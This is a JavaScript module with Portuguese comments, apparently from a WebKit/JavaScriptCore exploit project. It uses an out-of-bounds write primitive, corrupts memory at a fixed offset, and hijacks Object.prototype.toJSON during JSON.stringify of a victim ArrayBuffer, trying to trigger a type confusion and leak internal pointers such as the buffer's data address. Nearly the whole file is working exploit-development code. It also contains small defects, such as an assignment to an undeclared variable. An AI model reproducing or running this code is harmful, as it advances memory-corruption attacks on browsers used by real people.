
// js/script3/testArrayBufferVictimCrash.mjs (Sonda Agressiva para Vazamento de Campos Internos)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment,
    isOOBReady
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V28 = "Heisenbug_AggressiveInternalLeak_v1_Run2"; // Indicando nova execução

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;
const CORRUPTION_TARGET_OFFSET_FOR_HEISENBUG = 0x7C;

let toJSON_call_details_v28 = null;
let victim_ab_ref_for_probe = null;
let aggressive_probe_results_collector = {}; // Coletor para esta execução

function AggressiveInternalLeakProbe() {
    const FNAME_PROBE = "AggressiveInternalLeakProbe";
    let current_this_type_at_call = Object.prototype.toString.call(this);
    
    // Inicializa/reseta os resultados locais para ESTA chamada da sonda.
    // A variável de módulo aggressive_probe_results_collector será atualizada APENAS se this for o victim_ab.
    let local_probe_interactions = {
        type_at_probe_call: current_this_type_at_call,
        heisenbug_condition_met_for_reads: false,
        read_prop_slot0: "N/A",
        read_prop_slot1: "N/A",
        read_prop_slot2: "N/A",
        read_byteLength_prop: "N/A",
        read_buffer_prop: "N/A", // Comum em TypedArrays, não em ArrayBuffer diretamente
        errors: []
    };

    // Atualiza a estrutura global toJSON_call_details_v28 para logging externo consistente
    toJSON_call_details_v28 = {
        probe_variant: FNAME_MODULE_V28, // Usa o nome do módulo do teste
        this_type_in_toJSON: current_this_type_at_call,
        error_in_toJSON: null, // Erros gerais da sonda
        probe_called_on_victim: (this === victim_ab_ref_for_probe),
        detailed_probe_interactions: {} // Será preenchido se for o victim_ab
    };

    if (this === victim_ab_ref_for_probe) {
        logS3(`[${FNAME_PROBE}] Iniciando para VICTIM_AB. Tipo verificado: ${current_this_type_at_call}`, "leak");

        if (current_this_type_at_call === '[object Object]') {
            local_probe_interactions.heisenbug_condition_met_for_reads = true;
            logS3(`[${FNAME_PROBE}] HEISENBUG ATIVA PARA VICTIM_AB! Tipo: [object Object]. Tentando leituras agressivas...`, "vuln");

            try {
                // Slots especulativos do "butterfly" (que é m_impl, apontando para ArrayBufferContents)
                // Os nomes p0, p1, p2 são para tentar acessar índices 0, 1, 2 do butterfly.
                // Se cada slot do butterfly for 8 bytes (um JSValue):
                //  this.p0 -> *(m_impl + 0*8) -> m_firstView/m_refCount + parte do próximo campo
                //  this.p1 -> *(m_impl + 1*8) -> m_size (se alinhado) + parte do próximo campo (m_data)
                //  this.p2 -> *(m_impl + 2*8) -> m_data (se alinhado) + parte do próximo campo
                // Os offsets REAIS dentro de ArrayBufferContents são cruciais:
                // JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START (ex: 0x08)
                // JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START (ex: 0x10)

                const prop_slot0 = this.p0; // Tenta ler o que seria o slot 0 do butterfly
                local_probe_interactions.read_prop_slot0 = isAdvancedInt64Object(prop_slot0) ? prop_slot0.toString(true) : String(prop_slot0);
                logS3(`  [${FNAME_PROBE}] this.p0 (Conteúdo de m_impl[0]?) lido como: ${local_probe_interactions.read_prop_slot0}`, "leak");

                const prop_slot1 = this.p1; // Tenta ler o que seria o slot 1 do butterfly (m_impl + 8)
                local_probe_interactions.read_prop_slot1 = isAdvancedInt64Object(prop_slot1) ? prop_slot1.toString(true) : String(prop_slot1);
                logS3(`  [${FNAME_PROBE}] this.p1 (Conteúdo de m_impl[8]?, m_size?) lido como: ${local_probe_interactions.read_prop_slot1}`, "leak");
                
                const prop_slot2 = this.p2; // Tenta ler o que seria o slot 2 do butterfly (m_impl + 16)
                local_probe_interactions.read_prop_slot2 = isAdvancedInt64Object(prop_slot2) ? prop_slot2.toString(true) : String(prop_slot2);
                logS3(`  [${FNAME_PROBE}] this.p2 (Conteúdo de m_impl[16]?, m_data?) lido como: ${local_probe_interactions.read_prop_slot2}`, "leak");

                local_probe_interactions.read_byteLength_prop = String(this.byteLength);
                logS3(`  [${FNAME_PROBE}] this.byteLength (confuso) lido como: ${local_probe_interactions.read_byteLength_prop}`, "leak");
                
                // 'buffer' é uma propriedade de TypedArrays, não de ArrayBuffer. Pode dar erro ou undefined.
                try { local_probe_interactions.read_buffer_prop = String(this.buffer); } catch(e){ local_probe_interactions.read_buffer_prop = `Error: ${e.name}`; }
                logS3(`  [${FNAME_PROBE}] this.buffer (confuso) lido como: ${local_probe_interactions.read_buffer_prop}`, "leak");

            } catch (e_read) {
                const errorMsg = `Erro na leitura agressiva: ${e_read.name} - ${e_read.message}`;
                local_probe_interactions.errors.push(errorMsg);
                toJSON_call_details_v28.error_in_toJSON = errorMsg;
                logS3(`[${FNAME_PROBE}] ${errorMsg}`, "error");
            }
        } else {
            logS3(`[${FNAME_PROBE}] Heisenbug NÃO ATIVA para victim_ab no momento da tentativa de leitura. Tipo: ${current_this_type_at_call}`, "warn");
        }
        // Atualiza o coletor global APENAS se for o victim_ab
        aggressive_probe_results_collector = local_probe_interactions;
        toJSON_call_details_v28.detailed_probe_interactions = aggressive_probe_results_collector;
    }
    
    // Atualiza o tipo final em toJSON_call_details_v28 para o runner externo
    toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this); 

    return { 
        probe_run_variant: FNAME_MODULE_V28, 
        final_type_observed: toJSON_call_details_v28.this_type_in_toJSON,
        heisenbug_active_during_rw: local_probe_interactions.heisenbug_condition_met_for_reads // Retorna o status local da condição
    };
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAggressiveLeak`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentativa de Leak Agressivo via Heisenbug JSON (v1 Run2) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    toJSON_call_details_v28 = null; // Para o runner
    victim_ab_ref_for_probe = null;
    aggressive_probe_results_collector = {}; // Resetar coletor de resultados da sonda
    object_to_assign_in_probe = null; // Não estamos tentando assignar neste teste, apenas ler

    let errorCapturedMain = null;
    let stringifyOutput = null;
    let exploit_result = {
        success: false,
        heisenbug_detected_externally: false,
        probe_results_summary: null, // Para armazenar um resumo do aggressive_probe_results_collector
        message: "Exploração não iniciada."
    };
    
    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { throw new Error("OOB Init falhou ou m_length não expandido."); }
        logS3("Ambiente OOB inicializado e m_length expandido.", "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(CORRUPTION_TARGET_OFFSET_FOR_HEISENBUG)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(CORRUPTION_TARGET_OFFSET_FOR_HEISENBUG, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100); 

        victim_ab_ref_for_probe = new ArrayBuffer(VICTIM_AB_SIZE);
        // Não precisamos de Float64Array view aqui, pois não estamos verificando o buffer externamente para addrof.
        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE}) criado. Tentando JSON.stringify com ${AggressiveInternalLeakProbe.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: AggressiveInternalLeakProbe,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            
            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_probe)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_probe); 
            logS3(`  JSON.stringify completou. Saída stringify: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            // Logar os detalhes coletados pela sonda (que foram armazenados em aggressive_probe_results_collector)
            // e o toJSON_call_details_v28 final
            logS3(`  Detalhes FINAIS da Sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
            exploit_result.probe_results_summary = JSON.parse(JSON.stringify(aggressive_probe_results_collector)); // Copia os resultados da sonda

            exploit_result.heisenbug_detected_externally = (toJSON_call_details_v28 && toJSON_call_details_v28.this_type_in_toJSON === '[object Object]');
            logS3(`  Heisenbug ocorreu (conforme toJSON_call_details_v28.this_type_in_toJSON): ${exploit_result.heisenbug_detected_externally}`, exploit_result.heisenbug_detected_externally ? "vuln" : "warn", FNAME_CURRENT_TEST);

            if (exploit_result.heisenbug_detected_externally && aggressive_probe_results_collector.heisenbug_condition_met_for_reads) {
                logS3("PASSO 3: Heisenbug confirmada PELA SONDA! Analisando leituras agressivas...", "warn", FNAME_CURRENT_TEST);
                
                // Tentar converter e analisar os valores lidos em aggressive_probe_results_collector
                let p0_val = aggressive_probe_results_collector.read_prop_slot0;
                let p1_val = aggressive_probe_results_collector.read_prop_slot1;
                let p2_val = aggressive_probe_results_collector.read_prop_slot2;

                // Exemplo: Se this.p2 (slot 2) vazou m_data, ele deve ser um ponteiro não nulo.
                // (Esta lógica de conversão e verificação de ponteiro precisaria ser robusta)
                let potential_m_data_ptr = null;
                if (p2_val && p2_val !== "N/A" && !String(p2_val).startsWith("Error")) {
                    try {
                        if (String(p2_val).startsWith("0x")) { potential_m_data_ptr = new AdvancedInt64(p2_val); }
                        else {
                            const p2_dbl = parseFloat(p2_val);
                            if(!isNaN(p2_dbl)) {
                                const ab = new ArrayBuffer(8); new Float64Array(ab)[0] = p2_dbl; const u32 = new Uint32Array(ab);
                                potential_m_data_ptr = new AdvancedInt64(u32[0], u32[1]);
                            }
                        }
                    } catch(e_conv) { logS3(`Erro convertendo p2_val: ${e_conv}`, "error");}
                }

                if (potential_m_data_ptr && (potential_m_data_ptr.low() !== 0 || potential_m_data_ptr.high() !== 0)) {
                    exploit_result.success = true;
                    exploit_result.message = `LEAK POTENCIAL! Heisenbug OK, e this.p2 retornou: ${potential_m_data_ptr.toString(true)}`;
                    document.title = `${FNAME_MODULE_V28}: Leak m_data? ${potential_m_data_ptr.toString(true)}`;
                } else {
                    exploit_result.message = "Heisenbug ocorreu, leituras agressivas feitas, mas nenhum vazamento claro de m_data via this.p2.";
                    document.title = `${FNAME_MODULE_V28}: TC OK, No Leak m_data`;
                }
                
            } else {
                exploit_result.message = `Heisenbug não confirmada PELA SONDA no momento das leituras (${aggressive_probe_results_collector.heisenbug_condition_met_for_reads}), ou não detectada externamente. Tipo final em toJSON_call_details_v28: ${toJSON_call_details_v28 ? toJSON_call_details_v28.this_type_in_toJSON : 'N/A'}.`;
                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou para Agressividade`;
            }
            logS3(`  ${exploit_result.message}`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        } catch (e_str) {
            errorCapturedMain = e_str;
            exploit_result.message = `ERRO CRÍTICO durante JSON.stringify: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        exploit_result.message = `ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Exploração Agressiva: Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`  Resultados Detalhados da Sonda (aggressive_probe_results_collector): ${JSON.stringify(aggressive_probe_results_collector)}`, "leak", FNAME_CURRENT_TEST);
        if(exploit_result.leaked_m_data_ptr_candidate){ // Corrigido para usar a variável correta
            logS3(`  Candidato a m_data (Int64): ${exploit_result.leaked_m_data_ptr_candidate.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        
        victim_ab_ref_for_probe = null;
        aggressive_probe_results_collector = {}; 
    }
    
    return { 
        errorOccurred: errorCapturedMain, 
        toJSON_details: toJSON_call_details_v28, // Este é o objeto global atualizado pela última chamada da sonda
        exploit_attempt_result: exploit_result // Contém os resultados da análise e aggressive_probe_results_collector
    };
}
